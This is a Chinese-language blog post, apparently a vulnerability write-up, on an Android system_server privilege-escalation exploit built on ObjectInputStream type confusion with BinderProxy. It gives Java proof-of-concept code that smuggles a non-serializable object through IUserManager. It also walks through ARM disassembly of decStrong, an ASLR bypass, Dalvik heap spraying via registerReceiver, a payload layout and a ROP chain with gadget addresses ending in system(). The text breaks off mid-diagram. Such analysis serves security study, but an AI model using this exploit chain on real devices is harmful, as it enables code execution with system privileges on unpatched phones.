        <content type="html"><![CDATA[<p>java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，构造恶意的对象可在sysem_server进程中执行任意代码并获取提升的权限。其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p><p>binder service实际上并没有单独的进程，它们只是systemserver的一个子线程。init进程会启动surface flinger、media server、drmserver等服务，在这些服务里会创建binder service，并注册到service manager。native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//构建可序列化恶意对象</span></span><br><span class="line"><span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bindle</span>();</span><br><span class="line">AAdroid.os.<span class="type">BinderProxy</span> <span class="variable">evilProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AAdroid</span>.os.BinderProxy();</span><br><span class="line">bundle.putSerializable(<span class="string">&quot;eatthis&quot;</span>, evilProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//准备传入system_server的数据</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stubClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(Class inner : Class.forname(<span class="string">&quot;android.os.IUserManager&quot;</span>).getDeclaredClasses())&#123;</span><br><span class="line"><span class="comment">//获取android.os.IUserManager.Stub的class对象</span></span><br><span class="line"><span class="keyword">if</span>(inner.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub&quot;</span>))&#123;</span><br><span class="line">stubClass = inner;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Field</span> <span class="variable">TRANSACTION_setApplicationRestrictionsField</span> <span class="operator">=</span> stubClass.getDeclaredField(<span class="string">&quot;TRANSACTION_setApplicationRestrictions&quot;</span>)</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">proxyClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(Class inner : stubClass.getDeclaredClasses())&#123;</span><br><span class="line"><span class="keyword">if</span>(inner.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub.Proxy&quot;</span>))&#123;</span><br><span class="line">proxyClass = inner;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">UserManager</span> <span class="variable">userManager</span> <span class="operator">=</span> (UserManager)context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="type">Field</span> <span class="variable">mServiceField</span> <span class="operator">=</span> UserManger.class.getDeclaredField(<span class="string">&quot;mService&quot;</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">mService</span> <span class="operator">=</span> mServiceField.get(userManager);</span><br><span class="line"><span class="comment">//获得跨进程调用system_server的IBinder接口mRemote</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">mRemoteField</span> <span class="operator">=</span> proxyClass.getDeclaredField(<span class="string">&quot;mRemote&quot;</span>);</span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br><span class="line"><span class="type">UserHandle</span> <span class="variable">userHandle</span> <span class="operator">=</span> android.os.Process.myUserHandle();</span><br><span class="line">setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</span><br><span class="line"></span><br><span class="line"><span class="comment">//向system_server传入不可序列化的Bundle参数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="type">int</span> userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException &#123;</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">   _data.writeString(packageName);</span><br><span class="line">   _data.writeInt(<span class="number">1</span>);</span><br><span class="line">   restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">   _data.writeInt(userHandle);</span><br><span class="line">   <span class="type">byte</span>[] data = _data.marshall();<span class="comment">// 序列化，获得一个byte[]数组</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; <span class="literal">true</span>; i++) &#123;</span><br><span class="line"><span class="comment">//篡改了序列化字节中的类名，从而再反序列化时得到了原本不可序列化的BinderProxy</span></span><br><span class="line"><span class="comment">// 将这个数组中的”AAdr”修改成”andr”，要传输的对象的类型是AAdroid.os.BinderProxy，所以这里相当于把对象类型修改成了android.os.BinderProxy，这样就成功发送了恶意的对象</span></span><br><span class="line">       <span class="keyword">if</span> (data[i] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">           data[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">           data[i+<span class="number">1</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   _data.recycle();</span><br><span class="line">   _data = Parcel.obtain();</span><br><span class="line">   _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line">   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// Binder客户端的的mRemote其实是个BinderProxy类，使用transact方法描述符和参数传递给服务端进行远程调用</span></span><br><span class="line">   _reply.readException();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">   _reply.recycle();</span><br><span class="line">   _data.recycle();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>android.os.BinderProxy这个对象本身是不可序列化的，但是因为ObjectInputStream这个对象在反序列化时没有做校验，造成了类型混淆(type confusion)漏洞。BinderProxy的field被Native代码处理成指针，这个field就是我们在代码中设置的mOrgue。BinderProxy的finalize方法调用了Native代码，将mOruge处理成指针。</p><p>进程间传递Parcel类型数据，一端通过<code>writeToParcel</code>将对象映射成Parcel对象传递出去，另一端再通过<code>createFromParcel</code>将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过<code>writeToParcel</code>把对象写到流里面，在通过<code>createFromParcel</code>从流里读取对象。</p><p>然后看POC中修改过的不可反序列化的parcel对象<code>Android.os.BinderProxy</code>的处理过程，接POC最后执行流程，执行过<code>mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)</code>过后，system_server层会去调用<code>IUserManager.onTransact()</code>方法，来到<code>case TRANSACTION_setApplicationRestrictions</code>分支开始处理传进来的parcel数据流：</p><p>先是<code>_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)</code>读取数据对象，然后调用<code>this.setApplicationRestrictions(_arg0, _arg1, _arg2);</code></p><p>然后转入UserManagerService，UserManagerService继承<code>IUserManager.Stub</code>并实现了<code>setApplicationRestrictions</code>方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p><blockquote><p>IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;<br>UserManagerService.setApplicationRestrictions -&gt;<br>UserManagerService.writeApplicationRestrictionsLocked -&gt;<br>Bundle.keySet()(restrictions.keySet()) -&gt;<br>Bundle.unparcel() -&gt;<br>Parcel.readArrayMapInternal() -&gt;<br>Parcel.readValue(ClassLoader) -&gt;<br>Parcel.readSerializable(ClassLoader) -&gt;<br>ObjectInputStream.readObject() -&gt;<br>ObjectInputStream.readNonPrimitiveContent() -&gt;<br>ObjectInputStream.readNewObject() -&gt;补丁</p></blockquote><h2 id="Native分析："><a href="#Native分析：" class="headerlink" title="Native分析："></a>Native分析：</h2><p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个field就是之前设置的0x1337beef，就是mOrgue这个变量。</p><p>反序列化的时候调用java.io.ObjectInputStream对象的readObject()方法，这个方法从输入流中读取出对象，也就是我们定义的BinderProxy对象。这个对象被创建后，因为代码中没有再引用它，所以它会进入到”可复活状态”，准备被GC回收，在回收前就会调用它的finalize()方法。</p><p>android.os.BinderProxy的finalize方法调用native代码，会将mOrgue处理为指针：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">destroy(); <span class="comment">// android_os_BinderProxy_destroy</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.finalize();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中destroy函数的cpp代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IBinder* b = (IBinder*)</span><br><span class="line">env-&gt;<span class="built_in">GetIntField</span>(obj, gBinderProxyOffsets.mObject);</span><br><span class="line"><span class="comment">// 上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。</span></span><br><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">env-&gt;<span class="built_in">GetIntField</span>(obj, gBinderProxyOffsets.mOrgue); <span class="comment">// mOrgue被处理成了一个对象指针</span></span><br><span class="line"><span class="built_in">LOGDEATH</span>(<span class="string">&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;</span>, obj, b, drl);</span><br><span class="line">env-&gt;<span class="built_in">SetIntField</span>(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">env-&gt;<span class="built_in">SetIntField</span>(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">drl-&gt;<span class="built_in">decStrong</span>((<span class="type">void</span>*)javaObjectForIBinder);</span><br><span class="line"> <span class="comment">// drl就是mOrgue，可以被攻击者控制。drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。</span></span><br><span class="line">b-&gt;<span class="built_in">decStrong</span>((<span class="type">void</span>*)javaObjectForIBinder);</span><br><span class="line">IPCThreadState::<span class="built_in">self</span>()-&gt;<span class="built_in">flushCommands</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中decStrong定义在DeathRecipientList的父类RefBase中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RefBase::decStrong</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* id)</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">weakref_impl* <span class="type">const</span> refs = mRefs;</span><br><span class="line">refs-&gt;<span class="built_in">removeStrongRef</span>(id); <span class="comment">// 空实现</span></span><br><span class="line"><span class="type">const</span> <span class="type">int32_t</span> c = <span class="built_in">android_atomic_dec</span>(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line"><span class="built_in">ALOGD</span>(<span class="string">&quot;decStrong of %p from %p: cnt=%d\n&quot;</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">ALOG_ASSERT</span>(c &gt;= <span class="number">1</span>, <span class="string">&quot;decStrong() called on %p too many times&quot;</span>, refs);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">refs-&gt;mBase-&gt;<span class="built_in">onLastStrongRef</span>(id); <span class="comment">// 导致代码执行，并最终指向可执行的内存区域</span></span><br><span class="line"><span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">refs-&gt;<span class="built_in">decWeak</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对Android::RefBase::decStrong进行逆向，IDA打开libutils.so：</p><p>mRefs是RefBase对象中第一个成员变量，RefBase是DeathRecipientList对象的父类，在C++中，对象的内存布局是先放置父类，然后放置自己的成员。而一个对象中方法是不占空间的，如果有虚函数会有一个虚函数表的地址(4字节)放置在对象的最开始，然后放置各个成员变量。这个类是有虚函数的，所以这里的mRefs变量的地址是DeathRecipientList对象也就是我们设置的mOrgue指针指向地址+4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域</span></span><br><span class="line">ldr r4, [r0, <span class="comment">#4]   # mRefs被加载到r4，r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容</span></span><br><span class="line">mov r6, r1</span><br><span class="line">mov r0, r4         <span class="comment"># r4指向mRefs，r0指向mStrong</span></span><br><span class="line">blx &lt;android_atomic_dec ()&gt;    <span class="comment">#android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入android_atomic_dec ()</span></span><br><span class="line"><span class="comment"># 为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)，需要使refs-&gt;mStrong为1</span></span><br><span class="line">cmp r0, <span class="comment">#1          # r0 = refs-&gt;mStrong</span></span><br><span class="line">bne.n d1ea</span><br><span class="line">ldr r0, [r4, <span class="comment">#8]    # r4 = &amp;refs-&gt;mStrong</span></span><br><span class="line">mov r1, r6</span><br><span class="line">ldr r3, [r0, <span class="comment">#0] </span></span><br><span class="line">ldr r2, [r3, <span class="comment">#12]</span></span><br><span class="line">blx r2   <span class="comment"># 执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。</span></span><br></pre></td></tr></table></figure><p>mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。</p><h2 id="绕过ASLR："><a href="#绕过ASLR：" class="headerlink" title="绕过ASLR："></a>绕过ASLR：</h2><p>Android上有地址空间随机化(ASLR)，但是因为所有app都是fork自zygote进程，所以基础模块和dalvik-heap的内存布局全都是相同的。可以分析自己的内存布局获得system-server的内存布局，然后使用基础模块构建ROP链就可以绕过ASLR。</p><h2 id="Dalvik-heap-spary："><a href="#Dalvik-heap-spary：" class="headerlink" title="Dalvik-heap spary："></a>Dalvik-heap spary：</h2><p>为了能让blx r2这条执行能够可靠稳定的跳转到攻击者可控的代码，需要利用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。</p><p>向sysetem_server的dalvik-heap空间传入可控字符串，system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。</p><p>我们知道，同一进程的不同线程，是拥有各自的栈，但是互相共享text和data，所以堆也是可以共享的。所以，之前研究堆溢出时，可以看到malloc是有线程安全版本的，以保证不同线程分配堆时不会发生冲突。</p><p>于是，我们注册Receiver时，最终会调用<code>ActivityManagerService</code>中的方法<code>registerReceiver</code>，定义在文件<code>/frameworks/base/services/java/com/android/server/am/ActivityManagerService.java</code>中。其中会创建新的BroadcastFilter对象，这便是保存在堆上的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Intent <span class="title function_">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage,</span></span><br><span class="line"><span class="params">            IIntentReceiver receiver, IntentFilter filter, String permission, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="type">BroadcastFilter</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastFilter</span>(filter, rl, callerPackage,</span><br><span class="line">                    permission, callingUid, userId);</span><br></pre></td></tr></table></figure><p>所以通过注册Receiver的方式，我们在Activity Manager、即system_server的堆上布置了payload。</p><h2 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h2><p>0x0 ：构造POC控制PC，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">+---------+-------------------+---------------&gt; payload start</span><br><span class="line">          |      SA+GBO       |</span><br><span class="line">          |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |     SA+GBO-4      |      SAO</span><br><span class="line">Relative  |                   |</span><br><span class="line">          +-------------------+</span><br><span class="line">addresses |     SA+GBO-8      |</span><br><span class="line">          |                   |</span><br><span class="line">chunk     +-----------------------------------&gt; SA</span><br><span class="line">          |       ....        |</span><br><span class="line">          +-------------------+    GBO-SAO</span><br><span class="line">          |        1          |</span><br><span class="line">+-----------------------------+---------------&gt; SA+GBO-SAO = GBA</span><br><span class="line">          |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">Gadget    |        SA         |</span><br><span class="line">          +-------------------+</span><br><span class="line">Buffer    |    0xdeadbeef     |</span><br><span class="line">          +-------------------+</span><br><span class="line">          |    ROP chain 0    |</span><br><span class="line">+---------+-------------------+</span><br></pre></td></tr></table></figure><p>整个payload分为两段：第一段Relative Addresses Chunk(RAC)是很长的一段，用于跳转到第二段；第二段Gadget Buffer(GB)则是用来放gadget的。上图中：</p><ul><li>SA指Static Address，即我们用来设置mOrgue的一个固定的地址</li><li>GBO指Gadget Buffer Offset，指的是GB在payload中的偏移量，也就是第一段的长度</li><li>SAO即Static Address Offset, 为SA相对于payload的偏移量。</li></ul><p>根据payload第一段的构造方式，此时SA处的内容为SA+GBO-SAO，正好为GB的实际地址Gadget Buffer Address(GBA)。所以，只要我们的第一段足够大，使得SA落在其中，则[SA]&#x3D;GBA。</p><p>按照decStrong的执行流程，实际执行效果如下。</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>A                 PUSH            &#123;R4-R6<span class="punctuation">,</span>LR&#125;</span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>C                 MOV             R<span class="number">5</span><span class="punctuation">,</span> R<span class="number">0</span> </span><br><span class="line"><span class="comment">; r0是this指针，即我们设定的mOrgue的值SA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">15</span>E                 LDR             R<span class="number">4</span><span class="punctuation">,</span> [R0<span class="punctuation">,</span>#<span class="number">4</span>] </span><br><span class="line"><span class="comment">; r4 = [r0+4] = [SA+4] = SA+GBO-SAO-4 = GBA-4, 即r4是GB前4 BYTES处。</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">160</span>                 MOV             R<span class="number">6</span><span class="punctuation">,</span> R<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">162</span>                 MOV             R<span class="number">0</span><span class="punctuation">,</span> R<span class="number">4</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">164</span>                 BLX             android_atomic_dec </span><br><span class="line"><span class="comment">; 对r4调用android_atomic_dec: 该方法接收一个指针作为参数，将所指内容减1，并将减1前的结果返回</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">168</span>                 CMP             R<span class="number">0</span><span class="punctuation">,</span> #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>A                 BNE             loc_D<span class="number">184</span> </span><br><span class="line"><span class="comment">; 如果android_atomic_dec(r4)==1，即[r4]==1, 则进入下一环节。根据payload的构造，[GBA-4]=1，符合要求</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>C                 LDR             R<span class="number">0</span><span class="punctuation">,</span> [R4<span class="punctuation">,</span>#<span class="number">8</span>] </span><br><span class="line"><span class="comment">; r0 = [r4+8] = [GBA-4+8] = [GBA+4]，根据payload的构造，[GBA+4]=SA，即r0 = SA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">16</span>E                 MOV             R<span class="number">1</span><span class="punctuation">,</span> R<span class="number">6</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">170</span>                 LDR             R<span class="number">3</span><span class="punctuation">,</span> [R0]</span><br><span class="line"> <span class="comment">; r3 = [r0] = [SA] = GBA</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">172</span>                 LDR             R<span class="number">2</span><span class="punctuation">,</span> [R3<span class="punctuation">,</span>#<span class="number">0xC</span>] </span><br><span class="line"><span class="comment">; r2 = [r3+12] = [GBA+12]，即为ROP chain 0</span></span><br><span class="line">.text:<span class="number">0000</span>D<span class="number">174</span>                 BLX             R<span class="number">2</span> </span><br><span class="line"><span class="comment">; 执行ROP chain 0</span></span><br></pre></td></tr></table></figure><p>由此，我们实现了控制PC</p><p>0x1 然后就是搜索&#x2F;system&#x2F;lib&#x2F;下常用的库来构造ROPchain，</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ROP chain <span class="number">0</span></span><br><span class="line">libandroid_runtime.so thumb</span><br><span class="line"><span class="number">0x0007bcb2</span> : ldr r<span class="number">7</span><span class="punctuation">,</span> [r5] <span class="comment">; ldr r3, [r7, #0x14] ; blx r3</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">1</span></span><br><span class="line">libdvm.so thumb</span><br><span class="line"><span class="number">0x00041c12</span>: mov sp<span class="punctuation">,</span> r<span class="number">7</span><span class="comment">; pop [r4-r10, pc]</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">2</span></span><br><span class="line">libc.so arm</span><br><span class="line"><span class="number">0x0003c190</span> : ldr r<span class="number">0</span><span class="punctuation">,</span> [r0<span class="punctuation">,</span> #<span class="number">0x48</span>] <span class="comment">; pop &#123;r3, pc&#125;</span></span><br><span class="line"></span><br><span class="line">ROP chain <span class="number">3</span></span><br><span class="line">libc.so thumb</span><br><span class="line"><span class="number">799</span>: <span class="number">000246</span>a<span class="number">1</span>   <span class="number">200</span> FUNC    GLOBAL DEFAULT    <span class="number">8</span> system</span><br></pre></td></tr></table></figure><p>由于<code>decStrong</code>方法在开始执行时，首先会将<code>r0</code>的值保存到<code>r5</code>(见代码<code>0x0000D15C</code>处)，所以，通过chain 0 和chain 1，可以将<code>sp</code>的值设置到我们的Gadget Buffer中。随后，chain 2将<code>r0</code>设置为<code>[r0+0x48]</code>，即<code>r0=GBA-0x48</code>，我们把要执行的名称放在此处。最后，执行<code>system()</code>方法，其参数<code>r0</code>指向的，便是我们提供的要执行的命令。由此完成了整个ROP链，并以system的身份执行命令。</p><p>完整的payload结构示意图如下：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">`+----------------+-----------------+</span><br><span class="line">                 |                 |</span><br><span class="line">                 |                 |</span><br><span class="line">                 |       ...       |</span><br><span class="line">    Relative     |                 |</span><br><span class="line">                 |                 |</span><br><span class="line">    Addresses    +--------------------------------+</span><br><span class="line">                 |                 |</span><br><span class="line">    Chunk        |     command     |</span><br><span class="line">                 |                 |     <span class="number">0x48</span></span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |        <span class="number">1</span>        |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    